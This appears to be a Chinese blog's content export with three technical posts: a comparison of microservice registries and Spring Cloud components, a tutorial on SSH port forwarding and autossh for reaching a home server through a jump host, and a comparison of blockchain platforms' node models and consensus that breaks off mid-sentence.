id=\"2-Nacos\"><a href=\"#2-Nacos\" class=\"headerlink\" title=\"2. Nacos\"></a>2. Nacos</h3><p>Nacos是阿里巴巴旗下的开源项目，在2018年开源，携带着阿里巴巴大规模服务生产经验，试图在服务注册和配置管理这个市场上，提供给用户一个新的选择。</p>\n<ul>\n<li>Nacos一大特性是即支持CP，也支持AP。可以根据需要灵活选择。</li>\n<li>Nacos除了注册中心之外，也能充当配置中心的作用。且配置中心可以按照namespace，group等维度来进行数据隔离，来达到不同环境之间配置隔离的功能。</li>\n</ul>\n<blockquote>\n<p>值得一提的是，Nacos作为配置中心的持久化机制可以依赖于<code>Mysql</code>来完成（默认依赖于内置数据库）。只需要将Nacos目录下的sql脚本放到mysql中执行（会生成11个表），然后在nacos配置文件里面配一下mysql的账号密码即可。这样使用mysql作为数据源的方式相比于nacos内置数据库来说更容易管理</p>\n</blockquote>\n<h3 id=\"3-Consul\"><a href=\"#3-Consul\" class=\"headerlink\" title=\"3. Consul\"></a>3. Consul</h3><p>Consul是HashiCorp公司推出的一个开源工具。</p>\n<ul>\n<li>Consul是用Go语言编写的，所以无法像Eureka那样直接引入jar包就能集成，它还需要去服务器中进行额外的安装。</li>\n<li>除了注册中心的功能之外，Consul还能起到配置中心的作用。<br>Consul它保证的是CP，使用raft协议，要求必须有过半的结点都写入成功才算是注册成功了，并且它也有Master和Follower的概念，在Master挂掉后，也需要自己内部进行</li>\n</ul>\n<h3 id=\"4-Etcd（待续）\"><a href=\"#4-Etcd（待续）\" class=\"headerlink\" title=\"4. Etcd（待续）\"></a>4. Etcd（待续）</h3><p>对比SpringCloud，Kubernetes也提供完整的分布式微服务管理框架，几乎所有组件都有对应的产品，其中Etcd也可以提供类似Eureka的注册中心。</p>\n<p>在 Go 生态中，还可以选择基于 Etcd 作为注册中心，Etcd 是由 CoreOS 团队维护的、高可用分布式键值存储数据库，可用于为集群提供配置和服务发现功能，Google 开源的容器管理工具 Kuberbetes 就是基于 Etcd 的。</p>\n<p>和 Consul 一样，Etcd 也是基于 Raft 协议作为分布式一致性算法来解决领导者选举和日志复制问题，同样也是基于 Go 语言编写。</p>\n<p>Etcd 也支持代理模式（proxy），只不过在 Etcd 中，代理模式和 Consul 的客户端代理模式类似，安装在部署服务的节点上，用来转发请求到 Etcd 集群，本身不存储任何数据，Etcd 集群相当于 Consul 中以服务端模式运行的 Consul 集群，通常要求配置三个及以上节点（不要太多，3~5就够了，以便可用性和性能上达到平衡），负责真正的请求处理 —— 服务注册与发现。</p>\n<p>在目前最新版本的 Etcd v3中，通过网关模式（gateway）取代了 V2 版本中的代理模式（proxy）。</p>\n<p>从服务发现的实现原理上来说，Consul 和 Etcd 的基本设计思路是一致的，Etcd 更简单，Consul 则更像一个全栈的解决方案，功能比 Etcd 要更丰富，比如支持可视化的 Web UI 管理界面、支持多数据库中心、安全层面除了 HTTPS 外还支持 ACL、更加全面的健康检查功能、内置 DNS Server 等，这些都是 Etcd 所不具备的，但是更全面的功能往往意味着更高的复杂性，针对微服务的服务注册和发现场景，Etcd 完全够用了。</p>\n<hr>\n<h2 id=\"Spring-Cloud-全家桶的简介\"><a href=\"#Spring-Cloud-全家桶的简介\" class=\"headerlink\" title=\"Spring Cloud 全家桶的简介\"></a>Spring Cloud 全家桶的简介</h2><img src=\"/2021/06/20/%E5%9F%BA%E4%BA%8ESpring-Cloud%E7%9A%84%E5%BE%AE%E6%9C%8D%E5%8A%A1%E6%9E%B6%E6%9E%84%E5%88%86%E6%9E%90/mind.png\" class=\"\" title=\"核心组件脑图\">\n\n<ul>\n<li>Spring Cloud Config：配置管理工具包，让你可以把配置放到远程服务器，集中化管理集群配置，目前支持本地存储、Git 以及 Subversion。</li>\n<li>Spring Cloud Bus：事件、消息总线，用于在集群（例如，配置变化事件）中传播状态变化，可与 Spring Cloud Config 联合实现热部署。</li>\n<li><code>Eureka</code>：云端服务发现，一个基于 REST 的服务，用于定位服务，以实现云端中间层服务发现和故障转移。</li>\n<li><code>Hystrix</code>：熔断器，容错管理工具，旨在通过熔断机制控制服务和第三方库的节点,从而对延迟和故障提供更强大的容错能力。</li>\n<li><code>Zuul</code>：Zuul 是在云平台上提供动态路由,监控,弹性,安全等边缘服务的框架。Zuul 相当于是设备和 Netflix 流应用的 Web 网站后端所有请求的前门。</li>\n<li>Archaius：配置管理 API，包含一系列配置管理 API，提供动态类型化属性、线程安全配置操作、轮询框架、回调机制等功能。</li>\n<li>Consul：封装了 Consul 操作，Consul 是一个服务发现与配置工具，与 Docker 容器可以无缝集成。</li>\n<li>Spring Cloud for Cloud Foundry：通过 Oauth2 协议绑定服务到 CloudFoundry，CloudFoundry 是 VMware 推出的开源 PaaS 云平台。</li>\n<li>Spring Cloud Sleuth：日志收集工具包，封装了 Dapper 和 log-based 追踪以及 Zipkin 和 HTrace 操作，为 Spring Cloud 应用实现了一种分布式追踪解决方案。</li>\n<li>Spring Cloud Data Flow：大数据操作工具，作为 Spring XD 的替代产品，它是一个混合计算模型，结合了流数据与批量数据的处理方式。</li>\n<li>Spring Cloud Security：基于 Spring Security 的安全工具包，为你的应用程序添加安全控制。</li>\n<li>Spring Cloud Zookeeper：操作 Zookeeper 的工具包，用于使用 Zookeeper 方式的服务发现和配置管理。</li>\n<li>Spring Cloud Stream：数据流操作开发包，封装了与 Redis、Rabbit、Kafka 等发送接收消息。</li>\n<li>Spring Cloud CLI：基于 Spring Boot CLI，可以让你以命令行方式快速建立云组件。</li>\n<li><code>Ribbon</code>：提供云端负载均衡，有多种负载均衡策略可供选择，可配合服务发现和断路器使用。</li>\n<li>Turbine：Turbine 是聚合服务器发送事件流数据的一个工具，用来监控集群下 Hystrix 的 Metrics 情况。</li>\n<li><code>Feign</code>：Feign 是一种声明式、模板化的 HTTP 客户端。</li>\n<li>Spring Cloud Task：提供云端计划任务管理、任务调度。</li>\n<li>Spring Cloud Connectors：便于云端应用程序在各种 PaaS 平台连接到后端，如：数据库和消息代理服务。</li>\n<li>Spring Cloud Cluster：提供 Leadership 选举，如：Zookeeper，Redis，Hazelcast，Consul 等常见状态模式的抽象和实现。</li>\n<li>Spring Cloud Starters：Spring Boot 式的启动项目，为 Spring Cloud 提供开箱即用的依赖管理。</li>\n</ul>\n<hr>\n<h2 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h2><ul>\n<li><a href=\"https://zhuanlan.zhihu.com/p/63263168\">Nacos PMC 朱鹏飞的深度技术分析</a></li>\n<li><a href=\"https://toutiao.io/posts/uglos82/preview\">深入理解 Spring Cloud 核心组件与底层原理</a></li>\n<li><a href=\"https://segmentfault.com/a/1190000020849168\">Spring Cloud核心模型 &amp; 案例汇集</a></li>\n<li><a href=\"https://segmentfault.com/a/1190000039842901\">基于电商网站的spring Cloud架构分析</a></li>\n<li><a href=\"https://www.cnblogs.com/burningmyself/p/12941807.html\">一个完整的Spring Cloud的分布式架构</a></li>\n<li><a href=\"https://perkins4j2.github.io/posts/35353/\">Spring Cloud - Nacos与Eureka区别及如何选型</a></li>\n<li><a href=\"https://juejin.cn/post/6844904205870694413\">各大微服务注册中心简单对比：ZooKeeper、Eureka、Consul 、Nacos</a></li>\n<li><a href=\"http://www.vispractice.com/yxweb/blogs/API02.html\">微服务网关和服务注册中心</a></li>\n<li><a href=\"https://blog.csdn.net/dyc87112/article/details/116266269\">注册中心与API网关不是这样用的！</a></li>\n<li><a href=\"http://www.heartthinkdo.com/?p=1933\">Eureka介绍和部署</a></li>\n<li><a href=\"https://my.oschina.net/icebergxty/blog/3080748\">Eureka集群部署的踩坑记录</a></li>\n</ul>\n"},{"title":"基于ssh加密隧道的三种端口转发模式","url":"/2020/06/13/%E5%9F%BA%E4%BA%8Essh%E5%8A%A0%E5%AF%86%E9%9A%A7%E9%81%93%E7%9A%84%E4%B8%89%E7%A7%8D%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%A8%A1%E5%BC%8F/","content":"<p>去年购入的腾讯云ECS服务器虽然只有1vCpu、1G内存、40G硬盘，但是Linux服务器的效率就是高，跑个小网站那是杠杠的，不过XunSearch中文索引的磁盘消耗比较大，存储利用率超过95%，需要考虑扩容了。</p>\n<p>本着可劲折腾的原则，最近入手了一台Intel NUC主机，开始琢磨把Linux服务器搬到自己家里的宽带上，ECS只保留一个公网入口（家里宽带都是运营商的浮动私网IP地址，需要保留公网入口作为跳板机），为此潜心研究基于ssh加密隧道实现端口转发。</p>\n<blockquote>\n<pre><code>实际在咸鱼上剁手了两台NUC，新的八代i3作为开发机，二手五代i3作为生产机\n另外，感谢LP赞助了一台Huawei AR111 AccessRouter，彻底改造了家庭网络系统，还有一块即将到货的24寸IPS显示器\n</code></pre>\n</blockquote>\n<p>这里推荐两篇高水平的文章，一是<a href=\"http://www.imooc.com/article/28632\">来自慕课网的精品教材</a>，二是<a href=\"https://abcdabcd987.com/ssh/\">来自UW同学的简明教程</a>，内容已经很丰富准确了，在此衷心表示佩服，并补充几个自己的学习体会，以备日后纪念。</p>\n<h2 id=\"一、区分SSH服务端和Application服务端\"><a href=\"#一、区分SSH服务端和Application服务端\" class=\"headerlink\" title=\"一、区分SSH服务端和Application服务端\"></a>一、区分SSH服务端和Application服务端</h2><p>实际上，端口转发的技术框架中同时存在两对Client&#x2F;Server，分别是Application的客户端和服务器、SSH的客户端和服务器。</p>\n<p>如果Applicaiton的客户端和 SSH 的客户端位于SSH隧道的同一侧，而Applicaiton的服务器和 SSH 服务器位于 SSH 隧道的另一侧，那么这种端口转发类型就是本地端口转发，需要使用<code>-L</code>选项来创建，请参见下图。</p>\n<img src=\"/2020/06/13/%E5%9F%BA%E4%BA%8Essh%E5%8A%A0%E5%AF%86%E9%9A%A7%E9%81%93%E7%9A%84%E4%B8%89%E7%A7%8D%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%A8%A1%E5%BC%8F/ssh-local.jpeg\" class=\"\">\n\n<p>本地转发模式的命令：<code>ssh -L &lt;local port&gt;:&lt;remote host&gt;:&lt;remote port&gt; &lt;SSH server host&gt;</code></p>\n<p>反之，就是远程端口转发，需要使用<code>-R</code>选项来创建。这也是本次系统改造的基本思路，技术架构见下图  </p>\n<ul>\n<li>本地是SSH的客户端，因为家里的IP地址不固定，公网无法找到私有服务器！！！</li>\n<li>本地是App的服务端，因为Linux服务器和数据搬到了家里</li>\n</ul>\n<img src=\"/2020/06/13/%E5%9F%BA%E4%BA%8Essh%E5%8A%A0%E5%AF%86%E9%9A%A7%E9%81%93%E7%9A%84%E4%B8%89%E7%A7%8D%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%A8%A1%E5%BC%8F/ssh-remote.jpeg\" class=\"\">\n\n<p>远端转发模式的命令：<code>ssh -R &lt;local port&gt;:&lt;remote host&gt;:&lt;remote port&gt; &lt;SSH server host&gt;</code></p>\n<h2 id=\"二、端口转发的加密技术\"><a href=\"#二、端口转发的加密技术\" class=\"headerlink\" title=\"二、端口转发的加密技术\"></a>二、端口转发的加密技术</h2><p>SSH的安全性比较好，其对数据进行加密的方式主要有两种：对称加密（密钥加密）和非对称加密（公钥加密）。</p>\n<p>对称加密指加密解密使用的是同一套秘钥。Client端把密钥加密后发送给Server端，Server用同一套密钥解密。对称加密的加密强度比较高，很难破解。但是，Client数量庞大，很难保证密钥不泄漏。如果有一个Client端的密钥泄漏，那么整个系统的安全性就存在严重的漏洞。为了解决对称加密的漏洞，于是就产生了非对称加密。</p>\n<p>非对称加密有两个密钥：“公钥”和“私钥”。公钥加密后的密文，只能通过对应的私钥进行解密。想从公钥推理出私钥几乎不可能，所以非对称加密的安全性比较高。SSH的加密原理中，就使用了RSA非对称加密算法。</p>\n<p>整个过程是这样的：</p>\n<ol>\n<li>远程主机收到用户的登录请求，把自己的公钥发给用户。</li>\n<li>用户使用这个公钥，将登录密码加密后，发送回来。</li>\n<li>远程主机用自己的私钥，解密登录密码，如果密码正确，就同意用户登录。</li>\n</ol>\n<img src=\"/2020/06/13/%E5%9F%BA%E4%BA%8Essh%E5%8A%A0%E5%AF%86%E9%9A%A7%E9%81%93%E7%9A%84%E4%B8%89%E7%A7%8D%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%A8%A1%E5%BC%8F/ssh-demo.jpg\" class=\"\">\n\n<p>需要注意的是，图中SSH client和Sever之间的红色通信通道是加密的、安全的，但是其余部分的绿色通道并不是加密的，仍然存在安全风险！</p>\n<p>另外，还可以参见<a href=\"https://blog.caogo.cn/2019/05/04/%E4%B8%BAECS%E8%AE%BE%E7%BD%AEssh%E5%AF%86%E9%92%A5%E7%99%BB%E5%BD%95%E7%9A%84%E6%96%B9%E6%B3%95/\">为ECS设置ssh密钥登录的方法</a></p>\n<h2 id=\"三、SSH命令的几个重要参数\"><a href=\"#三、SSH命令的几个重要参数\" class=\"headerlink\" title=\"三、SSH命令的几个重要参数\"></a>三、SSH命令的几个重要参数</h2><p>除了<code>-L</code> 、<code>-R</code>、<code>-D</code>这三个区别转发模式的核心参数以外，SSH命令还有几个重要的参数：</p>\n<p><code>-f</code>    要求在执行命令前退至后台. 它用于当 准备询问口令或密语, 但是用户希望它在后台进行. 该选项隐含了 <code>-n</code>选项（把 stdin 重定向到 &#x2F;dev&#x2F;null）<br><code>-N</code>    不执行远程命令，仅仅用于转发端口(限协议第二版)，不用再弹回一个新的shell<br><code>-l</code>    指定ssh的login用户名<br><code>-p</code>    指定远程ssh的服务端口<br><code>-g</code>    允许远程主机连接到本地用于转发的端口，划重点！！！：<em><strong>远端转发模式不支持 -g 参数</strong></em></p>\n<pre><code>- 本地转发模式：SSH server host 是 SSH 服务器所在的主机，remote host 和 remote port 则分别指应用程序服务器所在主机和监听端口。如果 remote host 指定为 localhost 则认为应用程序服务器和 SSH 服务器在同一台主机上。应用`-g`选项后,`HOST A`不仅会监听 `localhost` 的 `P`端口，还能够监听所有网络接口的 `P`端口，所以`HOST C` 上的应用客户端就可以把消息发送到`HOSTA` 的 `P` 端口。\n\n- 远端转发模式：由于远端转发模式是在`HOST A`（即SSH Client）上发起命令，但需要基于`HOST B`（也就是SSH Server）提供的`sshd service`，在`HOST B`上建立侦听端口`P`，存在主机权限设置的风险，为此远端转发模式不支持`-g`参数，只能绑定在 `localhost`，也就是只有在`HOST B`的本机才可以访问，而其他外部主机都不能访问。 \n\n- 可能的解决方案：修改`HOST B`(也就是SSH服务器）的配置文件`/etc/ssh/sshd_config` ,在其中添加一行：`GatewayPorts yes`，保存配置文件后，需要重启SSH服务并重新建立隧道，此时就可以接受外部服务的调用了。但是，该方案由于需要`HOST B`对外暴露服务端口，仍然存在一定的风险隐患。 \n\n- 最佳方案是：服务仍然暴露在`localhost`，并采用Nginx反向代理对外服务。\n</code></pre>\n<p>最后，关于SSH命令的全部参数解释，请见<a href=\"http://linux.51yip.com/search/ssh\">参考文档</a>，并列出几个典型的命令示范：</p>\n<pre><code><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">ssh -R 10022:localhost:22 jumpbox</span><br><span class=\"line\">ssh -NR 0.0.0.0:18000:localhost:8000 jumpbox</span><br><span class=\"line\">ssh -NL 20022:localhost:10022 jumpbox</span><br><span class=\"line\">ssh -ND 1080 workplace</span><br></pre></td></tr></table></figure>\n</code></pre>\n<blockquote>\n</blockquote>\n<pre><code>附录：关于在“本地转发，远端转发，动态转发”中提及到的“[bind_address:]port”的补充说明\n\n1、“bind_address”值为“*”或者“为空”中的“为空”，是指这样的形式“:port”，而不是这样的形式“port”\n2、在“ssh_config文件”（在远端转发中，相应的是“sshd_config文件”）中可以配置“GatewayPorts”参数值。当该值为“yes”时，“port”等价于“*:port”；当该值为“no”时，“port”等价于“localhost:port”\n3、在执行ssh命令时，加入“-g”选项，等价于“*:port”的形式\n4、为了更好的可读性和更精准的定义，“bind_address”还是显式配置比较好\n</code></pre>\n<h2 id=\"四、autossh命令\"><a href=\"#四、autossh命令\" class=\"headerlink\" title=\"四、autossh命令\"></a>四、autossh命令</h2><p>实际测试过程中ssh服务并不稳定，经常出现连接中断的现象，于是研究利用<code>autossh</code>软件实现自动重连的功能。</p>\n<ol>\n<li><p>autossh的安装方法<br> 在 Ubuntu 上你可以使用 <code>sudo apt-get install autossh</code> 来安装。<br> 在 Mac 上则是 <code>brew install autossh</code>。</p>\n</li>\n<li><p>autossh的命令语法</p>\n<p> 命令语法：<br> <code>autossh [-V] [-M port[:echo_port]] [-f] [SSH_OPTIONS]</code></p>\n<p> 操作示例：<br> <code>$ autossh -M 5678 -CqTfnN -D 192.168.0.2:7070  freeoa@remote-host</code></p>\n<p> 参数解释：<br> <code>-M</code>                为autossh参数，是服务器echo机制使用的端口，连接出问题了会自动重连<br> <code>-CqTfnN -D</code>        为ssh参数</p>\n<p> 注意：<code>-M 0</code> 意味着关闭心跳监控，如果ssh子进程失败则直接退出autossh。<br> 但是，基于<a href=\"https://www.harding.motd.ca/autossh/README.txt\">autossh的man 文档</a>的说明，最佳实践恰恰是关闭监控，改为<code>autossh</code>命令中增加几个<code>ssh</code>的重要选项，包括<code>ServerAliveInterval</code> 和<code>ServerAliveCountMax</code>，具体示例为：</p>\n<pre><code> <figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">autossh -M 0 -fNR 7322:localhost:22 -o ServerAliveInterval=15 -o ServerAliveCountMax=6 root@example.com</span><br></pre></td></tr></table></figure>\n</code></pre>\n</li>\n<li><p>autossh开机自启动的设置方法</p>\n<p> 编辑文本文件 <code>/etc/rc.d/rc.local</code> ，并在里面 <code>exit 0</code> 这句话之前加上<br> <code>su - user -c autossh -NfR 10022:localhost:22 jumpbox</code><br> 其中 user 是你的用户名。</p>\n<p> 在某些条件下，该配置文件可能位置有变化，或者需要赋予可执行权限。<br> 需要注意的是，如果你需要开机时运行 autossh，你需要配置公钥登入，因为开机运行的时候是没有交互界面让你来输入密码的。</p>\n</li>\n<li><p>ssh端口占用情况的检查方法</p>\n<pre><code> <figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@local_host ~]<span class=\"comment\"># netstat -an |grep LISTEN</span></span><br><span class=\"line\">......</span><br><span class=\"line\"></span><br><span class=\"line\">[root@local_host ~]<span class=\"comment\"># lsof -i:4010</span></span><br><span class=\"line\">COMMAND   PID    USER   FD   TYPE             DEVICE SIZE/OFF NODE NAME</span><br><span class=\"line\">ssh      6710 lixl    5u  IPv6 0x15699cecfe8a4995      0t0  TCP localhost:altserviceboot (LISTEN)</span><br><span class=\"line\">autossh 46984 lixl    3u  IPv4 0x15699cece41d5e95      0t0  TCP localhost:altserviceboot (LISTEN)</span><br><span class=\"line\">​</span><br><span class=\"line\">[root@remote_host ~]<span class=\"comment\"># lsof -i:8080</span></span><br><span class=\"line\">COMMAND  PID USER   FD   TYPE DEVICE SIZE/OFF NODE NAME</span><br><span class=\"line\">sshd    9762 root   10u  IPv4 473994      0t0  TCP *:webcache (LISTEN)</span><br><span class=\"line\">sshd    9762 root   11u  IPv6 473995      0t0  TCP *:webcache (LISTEN)</span><br></pre></td></tr></table></figure>\n</code></pre>\n</li>\n</ol>\n<h2 id=\"五、关于动态端口转发\"><a href=\"#五、关于动态端口转发\" class=\"headerlink\" title=\"五、关于动态端口转发\"></a>五、关于动态端口转发</h2><img src=\"/2020/06/13/%E5%9F%BA%E4%BA%8Essh%E5%8A%A0%E5%AF%86%E9%9A%A7%E9%81%93%E7%9A%84%E4%B8%89%E7%A7%8D%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%A8%A1%E5%BC%8F/ssh-socks5.jpeg\" class=\"\">\n\n<p>通过动态端口转发，实现HTTP Proxy和Sock5 Proxy，这就是科学上网的基本原理，看图即可！<br>有份技术分析报告说的很清楚了，可以参考<a href=\"https://blog.csdn.net/watson2017/article/details/79897693\">HTTP代理和Socks代理的差异分析</a></p>\n<p>哎！这个周末码了这么多字，还亲自配画图，好累啊！！！</p>\n"},{"title":"基于区块链的五种开源技术平台","url":"/2019/11/29/%E5%9F%BA%E4%BA%8E%E5%8C%BA%E5%9D%97%E9%93%BE%E7%9A%84%E4%BA%94%E7%A7%8D%E5%BC%80%E6%BA%90%E6%8A%80%E6%9C%AF%E5%B9%B3%E5%8F%B0/","content":"<p>区块链的本质是DLT，即分布式账本技术（Distributed Ledger Technologies），目前比较活跃的有5个开源软件，分别是Hyperledger Fabric、R3 Corda、Ethereum、Facebook Libra、FISCO BCOS（分别简称为 Fabric、Corda、以太坊、Libra、BCOS）。</p>\n<p>三种不同的框架在可能的应用领域上分别具有完全不同的想法，其中：</p>\n<ul>\n<li>Corda的起源来自于金融服务行业，其业务模型与标准的区块链存在较大差异，可以称之为一个<strong>受区块链启发的开源的分布式账本平台</strong>。</li>\n<li>Fabric设计提供一种模块化、可扩展的架构，可用于从银行、医疗保健到供应链等各个行业。</li>\n<li>以太坊表现出完全独立于任何特定的应用领域。然而以太坊并未突出模块化，而重在为各种交易和应用提供一个通用平台。</li>\n</ul>\n<img src=\"/2019/11/29/%E5%9F%BA%E4%BA%8E%E5%8C%BA%E5%9D%97%E9%93%BE%E7%9A%84%E4%BA%94%E7%A7%8D%E5%BC%80%E6%BA%90%E6%8A%80%E6%9C%AF%E5%B9%B3%E5%8F%B0/640.jpeg\" class=\"\">\n\n<h2 id=\"运行模式（节点之间的地位）\"><a href=\"#运行模式（节点之间的地位）\" class=\"headerlink\" title=\"运行模式（节点之间的地位）\"></a>运行模式（节点之间的地位）</h2><p>在传统的集中式数据存储中，只有一个实体（即Owner，所有者）可以保留账本这一底层数据库的副本，这个Owner控制了全部的数据存储，并决定对其它实体提供什么数据。</p>\n<p>DLT的出现，从根本上改变了集中的数据存储方式，实现了多个实体都拥有底层数据库副本，形成一种由所谓“节点”或“对等端”构成的网络。</p>\n<p>根据网络架构中各个节点的地位是否相同或对等，存在两种不同的运行模式：</p>\n<ul>\n<li><strong>无授权模式</strong>（permissionless）：交易的参与者无需授权，网络中的任何实体都可以参与交易，并获得全量账本。<br>  作为公共区块链的以太坊采用无授权模式。</li>\n<li><strong>有授权模式</strong>（permissioned）：交易的参与者是网络中少数预先选择（授权）的节点，并且仅限于这些参与者维护全量账本，而绝大多数最终用户只能作为Client，以代理或网关方式通过某些特定的授权节点参与交易。<br>  Fabric和 Corda都属于有授权模式。</li>\n</ul>\n<blockquote>\n<p><strong>分布式账本</strong>和<strong>分布式数据库</strong>是两个完全不同的概念，虽然两者在技术上有很多相似之处。<br>从数据所有者的角度来看，TiDB、OceanBase等分布式数据库系统只有一个Owner主体，负责管理多个站点的数据副本；而分布式账本是多个互不信任的主体Owner来共同维护多个数据副本。</p>\n</blockquote>\n<h3 id=\"Corda\"><a href=\"#Corda\" class=\"headerlink\" title=\"Corda\"></a>Corda</h3><img src=\"/2019/11/29/%E5%9F%BA%E4%BA%8E%E5%8C%BA%E5%9D%97%E9%93%BE%E7%9A%84%E4%BA%94%E7%A7%8D%E5%BC%80%E6%BA%90%E6%8A%80%E6%9C%AF%E5%B9%B3%E5%8F%B0/corda.jpeg\" class=\"\">\n\n<p>在Corda的网络结构中，包含多个不同类型的功能节点：</p>\n<ul>\n<li>身份服务节点（绿色节点）：负责全网身份服务的系统节点，实现类似于传统网络架构中的CA（Certificate Authority）功能。该节点负责颁发证书，设置权限，任何想要加入Corda网络的节点都需要从身份服务节点处获得相应身份。</li>\n<li>网络映射服务节点（深蓝色节点）：提供类似于传统网络架构的DNS服务，负责将节点的证书及所提供的服务与其IP地址相关联，便于其它节点进行查询。</li>\n<li>普通用户节点（淡蓝色节点）：普通用户可以自由发起交易。交易产生后，被发送给指定的公证服务节点来验证其唯一性和有效性。如果交易合法，该公证服务节点便对这笔交易签名，并发回交易关联方。交易关联方及公证服务节点各自将该笔交易链接到之前的交易，形成“交易链”，达到交易关联方之间数据的局部统一。</li>\n<li>公证服务节点（黄色节点）：公证服务节点之间通过共识算法来保证全网数据的准确唯一性。Corda计划兼容多种共识算法，由不同的应用场景决定使用何种共识算法，目前提供了基于PBFT&#x2F;RAFT共识算法的公证服务的实现。由于Corda平台的共识是在公证服务节点之间互相达成的，为了减少交易延迟，提升交易吞吐量，开发团队建议将同一个网络的公证服务节点物理上放在一个区域。</li>\n<li>价值中介服务节点（黑色节点）：价值中介服务节点是一种负责和区块链网络外部取得可靠数据的节点。Corda网络可以通过价值中介服务节点获取现实世界的实时数据，从而提供多样化的交易场景。</li>\n</ul>\n<h3 id=\"Fabric\"><a href=\"#Fabric\" class=\"headerlink\" title=\"Fabric\"></a>Fabric</h3><p>与Fabric v0.6相比，v1.0的运行模式有了巨大变化，可以称之为”<strong>伪去中心化</strong>”，最新的v1.4的节点定义为：</p>\n<ul>\n<li>客户节点（Client）：客户节点代表最终用户，创建并调用交易。他们与对等节点和订购节点沟通。</li>\n<li>对等节点（Peer）：对等节点维护账本，并接收订购节点订购的更新消息，以向账本提交新的交易。其中，背书节点（Endorser）是一类特殊的对等节点，任务是通过检查自身是否满足一些必要的和充分的条件（例如提供所需的签名），对交易提供背书。</li>\n<li>排序节点（Orderer）：订购节点在Client和Peer间提供了通信通道，用于广播包含交易的消息。特别是对于共识，这些通道确保了所有已连接的对等节点按照完全相同的逻辑顺序传递完全相同的消息。</li>\n</ul>\n<h3 id=\"Libra\"><a href=\"#Libra\" class=\"headerlink\" title=\"Libra\"></a>Libra</h3><p>Libra也采用有授权模式，协议中有两种类型的节点：</p>\n<ul>\n<li>客户端（client）：client负责发起提交交易，查询信息等，比如钱包就是一个典型的 client。</li>\n<li>验证器（validator）：validators就像是元老会，会轮流着产生提议者（leader），用来将当前的交易定序、打包形成区块，并且共同维护着数据库的一致性。</li>\n</ul>\n<img src=\"/2019/11/29/%E5%9F%BA%E4%BA%8E%E5%8C%BA%E5%9D%97%E9%93%BE%E7%9A%84%E4%BA%94%E7%A7%8D%E5%BC%80%E6%BA%90%E6%8A%80%E6%9C%AF%E5%B9%B3%E5%8F%B0/libra.jpg\" class=\"\">\n\n<h2 id=\"共识算法（多个节点的工作协同）\"><a href=\"#共识算法（多个节点的工作协同）\" class=\"headerlink\" title=\"共识算法（多个节点的工作协同）\"></a>共识算法（多个节点的工作协同）</h2><p>选择无授权或有授权的参与模式，将对达成共识具有深远的影响。</p>\n<p>由于数据是分布式存储（或者，更准确的描述是分布式管理）的，因此难以确保所有节点对一些“共同事实”（例如，账本的正确性）达成一致。因为一个节点所做的更改，必须传播到网络中的所有其它的对等节点上。达成共同事实的结果，称之为节点间的<strong>共识</strong>(consensus)。</p>\n<p>在区块链中，无论参与者是否参与了某个特定的<strong>交易</strong>（Transaction），所有参与者必须就全部已发生交易的顺序达成共识。交易的顺序对账本的一致状态至关重要。如果无法建立明确的交易顺序，那么可能会出现双重支付（double-spends，也叫<strong>双花交易</strong>）问题，即两笔并行交易将同一枚货币转账给了不同的收款人，使其凭空受益。</p>\n<h3 id=\"以太坊\"><a href=\"#以太坊\" class=\"headerlink\" title=\"以太坊\"></a>以太坊</h3><p>由于网络所涉及的各方可能是互不信任的，并且是匿名的，因此必须采用共识机制来保护账本免受双重支付欺诈，或者心怀鬼胎参与者的影响。在目前的以太坊实现中，这种共识机制的建立是使用挖矿方案，也叫<strong>基于工作量的证明</strong>（PoW，Proof of Work）。</p>\n<p>所有参与者必须认同一个共同账本，并且可以访问账本中所有的记录条目。其结果是<strong>PoW</strong>会对交易的处理性能产生不利的影响。尽管记录是匿名的，但是存储在账本中的数据仍然可供所有参与者访问。因此对于有更高隐私度需求的应用而言，这种机制存在问题。</p>\n<h3 id=\"Fabric-1\"><a href=\"#Fabric-1\" class=\"headerlink\" title=\"Fabric\"></a>Fabric</h3><p>Fabric的节点在达成共识的过程中承担了不同的角色和任务，其交易流的的基本步骤为：</p>\n<ol>\n<li>Client向已连接的Endorser（Peer）发送交易，启动对账本的更新。</li>\n<li>所有Endorser都必须就提出的交易达成一致，因此需要根据更新所建议的账本达成某种共识。</li>\n<li>Client依次收集所有Endorser的批准，然后将经批准的交易发送给已连接的Orderer。</li>\n<li>所有Orderer就本批次被批准的交易再次达成共识。</li>\n<li>本批次交易将被转发给持有分类账的Peer，并最终提交交易。</li>\n</ol>\n<p>但由于涉及多个互不信任的订购节点，在传递消息时也可能会出现错误，因此仍然必须引入一致性算法，使得在出现故障（例如，消息顺序不一致）时可以达成一致，从而使分布式账本的复制过程支持容错。</p>\n<p>Fabric所采用的算法是“<strong>可插入的</strong>”，即可以根据特定应用的需求而使用各种算法，不再仅仅局限于基于<strong>PoW</strong>或其它衍生物的挖矿。例如，为了处理如上所述的随机或恶意复制错误，我们可以使用<strong>拜占庭式容错</strong>（BFT）的一种变体算法。</p>\n<p>不同于以太坊，Fabric运行在授权模式下，只有参与交易的节点（Peer &amp; Orderer）才必须要达成共识，因此性能上有了明显提高。此外，由于通道划分了消息流，这意味着Client只能看到它们连接通道中的消息及相关联的交易，而不知道其它通道的情况，因此可为记录提供更细粒度的访问控制，从而增强了隐私。</p>\n<blockquote>\n<p>目前Orderer是用一个中心化的Kafka cluster来做的，所以这里也没有拜占庭容错共识了！但是IBM说，这个地方是留给你自己开发BFT接口的，或者，你付钱给我来开发？？？</p>\n</blockquote>\n<h3 id=\"Corda-1\"><a href=\"#Corda-1\" class=\"headerlink\" title=\"Corda\"></a>Corda</h3><p>类似于 Fabric，Corda 的共识也是在交易层面达成的，仅涉及交易的各方。交易取决于共识是满足<strong>交易合法性</strong>（validity），还是<strong>交易唯一性</strong>（uniqueness）。</p>\n<p>交易合法性通过运行与交易相关联的智能合约代码（智能合约将在下文给出详细介绍），检查需要的所有签名，并确保所引用的任何交易也是有效的。  